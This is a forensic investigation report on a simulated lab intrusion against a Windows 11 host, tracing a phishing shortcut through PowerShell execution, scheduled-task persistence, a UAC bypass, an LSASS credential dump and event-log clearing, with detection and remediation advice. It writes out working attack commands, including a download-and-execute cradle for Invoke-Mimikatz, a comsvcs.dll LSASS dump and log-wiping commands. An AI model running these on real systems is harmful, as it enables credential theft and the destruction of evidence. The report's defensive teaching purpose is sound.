# DFIR Investigation Report: Spearphishing to Credential Compromise

> **Case ID:** LAB-DFIR-2026-0902 · **Classification:** Internal / Educational · **Report status:** Final
> **Analyst:** Senior DFIR Analyst · **Report date:** 2026-09-02 · **Timezone of all timestamps:** UTC (unless stated otherwise)

---

## 1. Executive Summary

On **2 September 2026**, a forensic investigation was performed on a compromised Windows 11 endpoint (`DESKTOP-UH2E7OM`, user `Victim`). The analysis reconstructed a full intrusion kill chain that began with a **malicious shortcut (`.lnk`) disguised as a PDF invoice** and ended with **credential theft via an LSASS memory dump**, followed by **anti-forensic log clearing**.

The actor used **Living-off-the-Land (LotL)** techniques almost exclusively — `powershell.exe`, `cmd.exe`, `schtasks.exe`, `rundll32.exe`, and `wevtutil.exe` — to minimize on-disk tooling. Critically, although the attacker cleared the **Security, System, and Application** event logs, **the `Microsoft-Windows-Sysmon/Operational` channel was not touched**, which preserved the single most valuable evidence source for this reconstruction.

**Assessed impact:** Theft of credential material from LSASS. On a default Windows 11 host this yields **NTLM hashes**. Because this is a credential-level compromise, the recommended recovery is **host reimage/rebuild plus credential reset**.

> **⚠️ Important framing — this is a controlled simulation.** The intrusion was executed by the lab operator using **Atomic Red Team** test definitions

---

## 2. Investigation Scope & Environment

| Item | Detail |
|---|---|
| Victim host | 1× Windows 11 VM — `DESKTOP-UH2E7OM`, user account `Victim` |
| Forensic workstation | 1× Windows 11 VM (isolated analysis host) |
| Methodology | **Dead-box forensics** — analysis of the acquired disk image without booting the victim OS, to preserve MACB timestamps and artifact integrity |
| Network | Fully isolated lab segment; no production connectivity |
| Primary artifact sources | NTFS `$MFT`, Prefetch, Registry (UserAssist, Run keys, `Tasks`), **Sysmon Operational** `.evtx`, Windows Security/System `.evtx`, Scheduled Task XML |
| Toolset | Eric Zimmerman's suite (**EvtxECmd, PECmd, LECmd, Registry Explorer, Timeline Explorer**), Autopsy, Windows Event Viewer, Sysmon |

---

## 3. Incident Timeline & Attack Reconstruction

Reconstructed by correlating **Sysmon Operational**, **Prefetch**, **UserAssist**, and **Scheduled Task** artifacts.
*Figure 1 is the master Sysmon/event timeline that underpins this table.*

![Figure 1 — Master Sysmon/Windows event timeline (EvtxECmd parsed into Timeline Explorer)](images/fig01-sysmon-timeline.png)
***Figure 1.** Master timeline: `EvtxECmd` output of the Sysmon Operational and Windows Defender channels, viewed in Timeline Explorer. Note the clean survival of Sysmon through the `wevtutil` clearing at 15:47:55–56.*

| # | Timestamp (UTC) | Phase | Tactic | Process / Event | Description |
|---|---|---|---|---|---|
| — | 15:43:43 | **Setup (Phase 0)** | Defense Evasion | Defender **EID 5001** | Real-time Protection disabled (operator pre-staging). |
| — | 15:44:16–49 | **Setup (Phase 0)** | C2 / Staging | Sysmon **EID 22/3** | DNS query + outbound connection to `20.205.243.166` (tooling host). |
| 1 | **15:46:19** | **Initial Access** | TA0001 | `CompanyA_Invoice.pdf.lnk` | **Kill chain begins.** User executes the LNK on the Desktop (UserAssist run count = 1). |
| 2 | 15:46:23 | Execution (decoy) | TA0002 | `NOTEPAD.EXE` | Decoy app launched to appear benign to the user. |
| 3 | 15:46:30 | Execution | TA0002 | `cmd.exe` → `powershell.exe` | LNK's embedded command spawns `cmd.exe`, which launches PowerShell with `IEX (New-Object Net.WebClient).DownloadString(...)`. |
| 4 | 15:46:33 | Execution | TA0002 | `powershell.exe` | Fileless in-memory download/execute from the GitHub-hosted script URL. |
| 5 | 15:46:30 → 15:47:34 | Discovery | TA0007 | `whoami.exe`, `hostname.exe` | Repeated host/user reconnaissance. |
| 6 | 15:47:01 | Persistence | TA0003 | `SCHTASKS.EXE` | Creates `T1053_005_OnLogon` (`/sc onlogon`). |
| 7 | 15:47:02 | Persistence | TA0003 | `SCHTASKS.EXE` | Creates `T1053_005_OnStartup` (`/sc onstart /ru system`). |
| 8 | 15:47:11 | Priv. Esc. / Def. Evasion | TA0004 | `powershell.exe` | Writes `HKCU\...\mscfile\shell\open\command` (UAC-bypass registry hijack). |
| 9 | 15:47:15 | Priv. Esc. | TA0004 | `cmd.exe` | Elevated (high-integrity) shell spawned via the `eventvwr.msc`/`mscfile` bypass. |
| 10 | 15:47:37 | Credential Access | TA0006 | `RUNDLL32.EXE` | LSASS (PID **840**) dumped via `comsvcs.dll MiniDump`. |
| 11 | 15:47:55–56 | Defense Evasion | TA0005 | `WEVTUTIL.EXE` | Clears **Security**, **System**, **Application** logs (Sysmon channel untouched). |

---

## 4. Detailed Forensic Analysis

### 4.1 Initial Access — Malicious LNK (T1566.001, T1204.002)

The entry point is a double-extension shortcut, `CompanyA_Invoice.pdf.lnk`, placed on the victim's Desktop.

**UserAssist** confirms interactive, user-driven execution — the hallmark of a successful spearphishing lure:

| Program (UserAssist) | Run count | Last executed (UTC) |
|---|---|---|
| `C:\Users\Victim\Desktop\CompanyA_Invoice.pdf.lnk` | **1** | **2026-09-02 15:46:19** |
| `{Programs}\System Tools\Command Prompt.lnk` | 3 | 15:48:45 |
| `{Common Programs}\Administrative Tools\Event Viewer.lnk` | 2 | (post-exploit) |

![Figure 2 — UserAssist evidence of LNK execution](images/fig02-userassist.png)
***Figure 2.** Registry Explorer — UserAssist. `CompanyA_Invoice.pdf.lnk` shows a run count of 1 at 15:46:19, establishing the user-execution entry point (T1204.002).*

**LNK internals (LECmd).** Parsing the shortcut reveals the command embedded inside it — the true core of the initial access. Run:

```
LECmd.exe -f "C:\Users\Victim\Desktop\CompanyA_Invoice.pdf.lnk" --csv . --csvf lnk.csv
```

Based on the embedded command captured in Sysmon (Figure 1, 15:46:30), the LNK's relevant fields are:

| LECmd field | Value |
|---|---|
| Target / Relative path | `..\..\..\..\Windows\System32\cmd.exe` |
| **Arguments** | `/c calc.exe & powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"` |
| Icon location | *(spoofed to a PDF icon to reinforce the invoice lure)* |
| Working directory | `%SystemRoot%\System32` |

![Figure 8 — LECmd parse of CompanyA_Invoice.pdf.lnk (to be inserted)](images/fig08-lecmd-lnk.png)
***Figure 8.** LECmd output for the malicious LNK. Insert the LECmd screenshot/CSV so the embedded `cmd → powershell IEX` command is visible as primary initial-access evidence.*

---

### 4.2 Execution — Fileless PowerShell (T1059.001, T1059.003, T1105)

At **15:46:30–33**, `cmd.exe` launched PowerShell which pulled a script directly into memory (no payload written to disk):

```text
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1')"
```

The destination `20.205.243.166` (contacted during Phase 0 staging) is within **Microsoft/Azure** space used by GitHub infrastructure; it should be **validated against known GitHub ranges** before treating it as a hostile C2 (see Limitations §11). The TLS setup line (`[Net.ServicePointManager]::SecurityProtocol`) and `Test-Path` checks visible in Figure 1 are consistent with a scripted download cradle.

---

### 4.3 Discovery (T1033, T1082)

`whoami.exe` (T1033 — System Owner/User Discovery) and `hostname.exe` (T1082 — System Information Discovery) were executed repeatedly between 15:46:30 and 15:47:34 (confirmed in both **Prefetch** and **Sysmon**), consistent with automated recon between stages.

![Figure 3 — Prefetch: executed binaries](images/fig03-prefetch-executables.png)
***Figure 3.** PECmd — binaries executed from the victim volume, showing the `powershell → whoami/hostname → schtasks → rundll32 → wevtutil` progression.*

---

### 4.4 Persistence — Scheduled Tasks (T1053.005)

Two scheduled tasks were created via `schtasks.exe` and are present in the Task Scheduler tree and Registry `Tasks` hive:

```text
schtasks /create /tn T1053_005_OnLogon  /sc onlogon           /tr "cmd.exe /c calc.exe"
schtasks /create /tn T1053_005_OnStartup /sc onstart /ru system /tr "cmd.exe /c calc.exe"
```

- **Payload:** `cmd.exe /c calc.exe` — a **benign Atomic Red Team placeholder** standing in for a real second-stage payload.
- **Author:** `DESKTOP-UH2E7OM\Victim`.
- The task names (`T1053_005_*`) directly identify the **Atomic Red Team T1053.005** test definitions used (see §12).

![Figure 5 — Task Scheduler tree with rogue tasks](images/fig05-taskscheduler-tree.png)
***Figure 5.** Task Scheduler tree — `T1053_005_OnLogon` and `T1053_005_OnStartup` appear among legitimate tasks.*

![Figure 6 — Scheduled task detail: OnLogon](images/fig06-task-onlogon.png)
***Figure 6.** `T1053_005_OnLogon` — Action `cmd.exe /c calc.exe`, GUID `{9AFA980B-D7DA-4EDD-82DA-B225FF2A1EFE}`, author `DESKTOP-UH2E7OM\Victim`.*

![Figure 7 — Scheduled task detail: OnStartup](images/fig07-task-onstartup.png)
***Figure 7.** `T1053_005_OnStartup` — Action `cmd.exe /c calc.exe`, key `{CE7575DC-468E-4999-9B96-D120B5D22FE2}`.*

---

### 4.5 Privilege Escalation — UAC Bypass (T1548.002, T1112)

At **15:47:11**, Sysmon captured PowerShell writing the `mscfile` shell-open-command key:

```text
New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
```

`eventvwr.msc` is associated with the `mscfile` class. When `eventvwr.msc` auto-elevates and reads the hijacked key, it launches the attacker's command as a **high-integrity process** without a UAC prompt — spawning the elevated `cmd.exe` observed at 15:47:15. The registry write itself is also **T1112 — Modify Registry**.

---

### 4.6 Credential Access — LSASS Dump via LotL (T1003.001, T1218.011)

At **15:47:37**, `rundll32.exe` abused the signed, native `comsvcs.dll` to dump LSASS — a classic LotL credential-theft primitive (also **T1218.011 — Rundll32**):

```text
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump 840 C:\Users\Victim\AppData\Local\Temp\lsass-comsvcs.dmp full
```

- **Target:** PID **840** (LSASS). **Output:** `C:\Users\Victim\AppData\Local\Temp\lsass-comsvcs.dmp` — the **user's local temp directory** (not a "hidden" directory).
- **What the dump actually yields:** On a default Windows 11 host, offline parsing of this dump recovers **NTLM hashes** and **Kerberos ticket/TGT material** suitable for pass-the-hash / pass-the-ticket. **Cleartext passwords are *not* present by default** — they would only appear if **`WDigest` caching was enabled** (`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1`). Verify that value before asserting cleartext exposure.

![Figure 4 — Prefetch: last-execution times for key binaries](images/fig04-prefetch-lastrun.png)
***Figure 4.** PECmd — last-run times, including `powershell.exe` (15:47:37) and `cmd.exe` (15:48:48), corroborating the credential-access window.*

---

### 4.7 Defense Evasion — Log Clearing & Why Sysmon Survived (T1562.001, T1070.001)

**Defender tampering (T1562.001).** Real-time Protection was disabled at 15:43:43 (Defender **EID 5001**) — classified here as Phase 0 operator setup (§4).

**Log clearing (T1070.001).** At 15:47:55–56, `wevtutil.exe` cleared three channels:

```text
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

Expected clearing artifacts to corroborate this (collect from any forwarded/SIEM copy, since the local copies were wiped):

| Event ID | Channel | Meaning |
|---|---|---|
| **1102** | Security | The **Security** audit log was cleared |
| **104** | System | The **System** / Application log was cleared (also raised per-channel) |

**Key analytical point — Sysmon survived.** `wevtutil cl Security/System/Application` clears **only those three legacy channels**. It **does not touch `Microsoft-Windows-Sysmon/Operational`**, which is a separate, independently-named channel. Because the attacker did not enumerate or clear Sysmon, the complete process-creation, network, registry, and file-create record remained intact — and is the backbone of this entire reconstruction (Figure 1). This is both a finding (incomplete anti-forensics by the actor) and a defensive lesson (deploy Sysmon on a channel attackers routinely overlook, and forward it off-host).

---

## 5. MITRE ATT&CK Summary (Technique → Evidence → Tactic)

| Technique (ID) | Evidence in this case | Tactic |
|---|---|---|
| T1566.001 — Spearphishing Attachment | `CompanyA_Invoice.pdf.lnk` on Desktop | Initial Access |
| **T1204.002 — User Execution: Malicious File** | UserAssist run count 1 @ 15:46:19 (Fig 2) | Execution |
| T1059.001 — PowerShell | `IEX DownloadString` cradle  | Execution |
| T1059.003 — Windows Command Shell | `cmd.exe /c …` from LNK | Execution |
| T1105 — Ingress Tool Transfer | `Net.WebClient.DownloadString` from GitHub host | Command & Control |
| **T1033 — System Owner/User Discovery** | `whoami.exe`  | Discovery |
| **T1082 — System Information Discovery** | `hostname.exe` | Discovery |
| T1053.005 — Scheduled Task | `T1053_005_OnLogon` / `OnStartup` | Persistence |
| T1548.002 — Abuse Elevation Control: Bypass UAC | `mscfile` key write @ 15:47:11 | Privilege Escalation |
| T1112 — Modify Registry | `New-Item HKCU:\…\mscfile\…` | Defense Evasion |
| T1003.001 — LSASS Memory | `comsvcs.dll MiniDump 840` → `.dmp` | Credential Access |
| **T1218.011 — System Binary Proxy Execution: Rundll32** | `rundll32.exe comsvcs.dll …` | Defense Evasion |
| **T1562.001 — Impair Defenses: Disable or Modify Tools** | Defender RTP disabled (EID 5001) | Defense Evasion |
| T1070.001 — Clear Windows Event Logs | `wevtutil cl` ×3; EID 1102/104 | Defense Evasion |

---

## 6. Indicators of Compromise (IOCs)

> *Compute and insert the real SHA-256 values from the preserved artifacts before distribution.*

### File artifacts
| Artifact | Path |
|---|---|
| Malicious LNK | `C:\Users\Victim\Desktop\CompanyA_Invoice.pdf.lnk` | 
| LSASS dump | `C:\Users\Victim\AppData\Local\Temp\lsass-comsvcs.dmp` | 

### Host / behavioral indicators
| Type | Value |
|---|---|
| Host | `DESKTOP-UH2E7OM` (user `Victim`) |
| Scheduled tasks | `\T1053_005_OnLogon`, `\T1053_005_OnStartup` |
| Task GUIDs | `{9AFA980B-D7DA-4EDD-82DA-B225FF2A1EFE}`, `{CE7575DC-468E-4999-9B96-D120B5D22FE2}` |
| Registry (UAC bypass) | `HKCU\software\classes\mscfile\shell\open\command` |
| LSASS PID (this run) | `840` |
| Suspicious command lines | `rundll32 … comsvcs.dll MiniDump …`; `IEX (New-Object Net.WebClient).DownloadString(...)`; `wevtutil cl Security/System/Application` |

### Network indicators
| Type | Value | Note |
|---|---|---|
| IP (destination) | `20.205.243.166` | Microsoft/Azure space used by GitHub infra — **validate** before treating as hostile |
| URL | `https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1` | Script-download source |

---

## 7. Detection Opportunities

| Detection | Signal | Catches |
|---|---|---|
| **Sysmon EID 10** — ProcessAccess to `lsass.exe` | Non-system process opening LSASS with `0x1010`/`0x1410` access | LSASS dumping  |
| **Sysmon EID 13** — RegistryValueSet on `…\mscfile\shell\open\command` | Write to the `mscfile` open command | UAC bypass  |
| **Sysmon EID 1** — `rundll32.exe` + `comsvcs.dll MiniDump` | Command-line pattern | LotL cred dump |
| **Sysmon EID 11** — FileCreate of `*lsass*.dmp` in a temp path | Dump file written | Credential theft artifact |
| **PowerShell EID 4104** — Script Block Logging | Logs the decoded `IEX`/download cradle | Fileless execution  |
| **Security EID 4698** | Scheduled task created | Persistence |
| **Security EID 1102 / System EID 104** | Log cleared | Anti-forensics |

---

## 8. Incident Response & Remediation

### 8.1 Immediate Containment
- **Network-isolate** the host immediately (compromised credentials enable lateral movement).
- **Treat all credentials cached on the host as compromised.**

### 8.2 Evidence Preservation (do this *before* any cleanup)
- **Preserve, do not delete, the dump file.** Copy `lsass-comsvcs.dmp` and the LNK to evidence storage and **hash them (SHA-256)** before any removal. Securely wiping evidence prematurely destroys chain of custody and blocks scope confirmation.

### 8.3 Eradication & Recovery — **Reimage, don't clean**
- Because this is a **credential-level compromise**, the correct action is to **rebuild/reimage the host from a known-good image**. Manually deleting the tasks, registry key, and dump does **not** guarantee eradication (unknown secondary implants, in-memory artifacts, tampered binaries).
- **Reset credentials** for `Victim` and **any account whose secrets may have resided in LSASS** (including privileged/domain accounts), and **invalidate Kerberos tickets** (consider a `krbtgt` double-reset if a domain account was exposed).
- Rebuilt host returns to service only after re-enabling defenses (below) are confirmed.

### 8.4 Strategic Prevention (sharpened)
| Control | Stops / detects |
|---|---|
| **Defender Tamper Protection** | Blocks the 15:43:43 RTP-disable step (T1562.001) |
| **ASR rule: "Block credential stealing from LSASS"** (`9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`) | Blocks the `comsvcs.dll` LSASS dump (T1003.001) |
| **LSA Protection (`RunAsPPL=1`) / Credential Guard** | Prevents LSASS memory access even by admins |
| **PowerShell Script Block Logging (EID 4104)** + Constrained Language Mode | Exposes/limits the fileless `IEX` cradle |
| **Sysmon tuned for EID 10 (LSASS access) & EID 13 (`mscfile` registry)** | Detects cred dumping and the UAC bypass |
| **Block/quarantine `.lnk` email attachments** at the gateway | Removes the initial-access vector (T1566.001) |
| **Centralized log forwarding (SIEM) + WEF** | Preserves evidence off-host even when `wevtutil cl` runs locally |

---

## 9. Tool & Simulation Credits

- **Adversary emulation:** [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) (Red Canary) — the `T1053_005_*` task names correspond to its T1053.005 scheduled-task atomics; the LotL techniques here map to its T1003.001, T1548.002, T1218.011, and T1562.001 tests.
- **Forensic tooling:** [Eric Zimmerman's Tools](https://ericzimmerman.github.io/) — EvtxECmd, PECmd, LECmd, Registry Explorer, Timeline Explorer.
- **Telemetry:** [Sysmon (Sysinternals)](https://learn.microsoft.com/sysinternals/downloads/sysmon).
- **Framework:** [MITRE ATT&CK](https://attack.mitre.org/).

---

## 10. Figure Index

| Figure | File | Shows |
|---|---|---|
| 1 | `images/fig01-sysmon-timeline.png` | Master Sysmon/Defender timeline (Timeline Explorer) |
| 2 | `images/fig02-userassist.png` | UserAssist — LNK execution |
| 3 | `images/fig03-prefetch-executables.png` | Prefetch — executed binaries |
| 4 | `images/fig04-prefetch-lastrun.png` | Prefetch — last-run times |
| 5 | `images/fig05-taskscheduler-tree.png` | Task Scheduler tree — rogue tasks |
| 6 | `images/fig06-task-onlogon.png` | Scheduled task detail — OnLogon |
| 7 | `images/fig07-task-onstartup.png` | Scheduled task detail — OnStartup |
| 8 | `images/fig08-lecmd-lnk.png` | LECmd parse of the LNK (to be added) |

---

**Disclaimer:** This investigation was conducted entirely within an isolated, controlled lab environment for **educational and portfolio purposes**. All indicators of compromise, tools, and payloads referenced were used solely for simulation and forensic-analysis training. The `calc.exe` payloads and Atomic Red Team test definitions are benign stand-ins for real malicious behavior.
